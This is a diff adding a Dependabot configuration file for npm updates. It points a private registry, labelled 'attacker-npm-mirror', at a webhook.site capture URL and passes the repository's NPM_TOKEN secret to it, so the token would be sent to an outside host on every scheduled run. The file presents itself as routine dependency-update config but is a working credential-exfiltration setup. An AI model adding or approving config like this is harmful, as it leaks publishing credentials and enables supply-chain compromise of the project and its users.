@@ -1,0 +1,13 @@
+version: 2
+registries:
+  attacker-npm-mirror:
+    type: npm-registry
+    url: https://webhook.site/4bc81f45-f0fd-4dc5-8b73-de3957e1dce6
+    token: ${{secrets.NPM_TOKEN}}
+updates:
+  - package-ecosystem: npm
+    directory: /
+    schedule:
+      interval: daily
+    registries:
+      - attacker-npm-mirror
